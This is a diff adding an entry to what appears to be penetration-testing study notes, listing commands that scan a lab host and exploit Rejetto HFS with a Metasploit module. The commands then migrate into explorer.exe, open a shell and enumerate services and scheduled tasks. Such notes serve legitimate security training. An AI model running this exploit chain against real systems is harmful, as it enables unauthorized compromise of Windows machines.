@@ -1834,7 +1834,22 @@ route print
 arp -a
 netstat -ano
 ```
-
-
-
+96) Enumerating Processes & Services
+```
+nmap -sV 10.2.19.62
+searchsploit rejetto
+msfconsole
+use exploit/windows/http/rejetto_hsf_exec
+set RHOSTS 10.2.19.62
+exploit
+ps
+pgrep explorer.exe
+migrate 2176
+shell
+net start
+wmic service list brief
+tasklist /SVC
+schtasks /query /fo LIST
+```
+97)
 
